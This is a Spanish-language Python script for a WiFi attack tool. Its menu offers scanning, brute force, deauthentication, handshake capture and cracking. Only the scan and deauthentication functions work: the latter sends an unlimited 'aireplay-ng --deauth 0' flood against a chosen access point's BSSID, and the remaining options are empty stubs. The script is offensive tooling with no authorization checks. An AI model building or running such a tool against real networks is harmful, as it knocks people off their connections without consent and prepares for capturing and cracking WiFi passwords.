import os
import subprocess
import re

def banner():
    os.system('clear')
    print("""
      __        ___ _____ _   ____            _            _     _____           _ 
     \ \      / (_)  ___(_) |  _ \ ___ _ __ | |_ ___  ___| |_  |_   _|__   ___ | |
      \ \ /\ / /| | |_  | | | |_) / _ \ '_ \| __/ _ \/ __| __|   | |/ _ \ / _ \| |
       \ V  V / | |  _| | | |  __/  __/ | | | ||  __/\__ \ |_    | | (_) | (_) | |
        \_/\_/  |_|_|   |_| |_|   \___|_| |_|\__\___||___/\__|   |_|\___/ \___/|_|
                                                                             
    Desarrollada por Thomas O'Neil Álvarez
    ======================================
    """)

def menu():
    print("[1] Escanear redes WiFi")
    print("[2] Realizar ataque de fuerza bruta")
    print("[3] Ataque de desautenticación")
    print("[4] Capturar Handshake")
    print("[5] Cracking de Handshake")
    print("[6] Guardar resultados del escaneo")
    print("[7] Cargar configuración")
    print("[8] Salir")

def scan_wifi():
    iface = input('Introduce la interfaz de red (por ejemplo, wlan0): ').strip()

    if not os.path.exists(f'/sys/class/net/{iface}'):
        print(f'ERROR: La interfaz {iface} no existe.')
        return []

    # Escanear redes WiFi
    print('Escaneando redes WiFi con iwlist...')
    try:
        cmd = ['sudo', 'iwlist', iface, 'scan']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print('ERROR: No se pudo ejecutar el escaneo.')
            return []

        output = result.stdout
        networks = []

        # Analizar el resultado del escaneo
        cells = output.split('Cell')
        for cell in cells[1:]:
            ssid = re.search(r'ESSID:"(.*?)"', cell)
            bssid = re.search(r'Address: (.*?)\n', cell)
            if ssid and bssid:
                essid = ssid.group(1)
                bssid = bssid.group(1)
                networks.append((essid, bssid))
                print(f'{len(networks)}: {essid} ({bssid})')

        return networks

    except Exception as e:
        print(f'ERROR: {e}')
        return []

def deauth_attack():
    networks = scan_wifi()
    if not networks:
        print('No se encontraron redes WiFi para atacar.')
        return
    
    print('Selecciona una red por el número:')
    for i, (essid, bssid) in enumerate(networks):
        print(f'{i + 1}: {essid} ({bssid})')

    try:
        choice = int(input('Número de red: ').strip())
        if 1 <= choice <= len(networks):
            essid, bssid = networks[choice - 1]
            print(f'Seleccionado: {essid} ({bssid})')
        else:
            print('Opción no válida.')
            return
    except ValueError:
        print('Entrada no válida. Debe ser un número.')
        return

    iface = input('Introduce la interfaz de red (por ejemplo, wlan0): ').strip()
    if not os.path.exists(f'/sys/class/net/{iface}'):
        print(f'ERROR: La interfaz {iface} no existe.')
        return

    print('Iniciando ataque de desautenticación...')
    try:
        cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, iface]
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.returncode != 0:
            print('Error al ejecutar el ataque de desautenticación.')
    except Exception as e:
        print(f'Error al ejecutar el ataque de desautenticación: {e}')

def main():
    banner()
    while True:
        menu()
        choice = input('Selecciona una opción: ').strip()
        if choice == '1':
            scan_wifi()
        elif choice == '2':
            # Implementar función para ataque de fuerza bruta
            pass
        elif choice == '3':
            deauth_attack()
        elif choice == '4':
            # Implementar función para capturar handshake
            pass
        elif choice == '5':
            # Implementar función para cracking de handshake
            pass
        elif choice == '6':
            # Implementar función para guardar resultados del escaneo
            pass
        elif choice == '7':
            # Implementar función para cargar configuración
            pass
        elif choice == '8':
            print('Saliendo...')
            break
        else:
            print('Opción no válida')

if __name__ == '__main__':
    main()


1
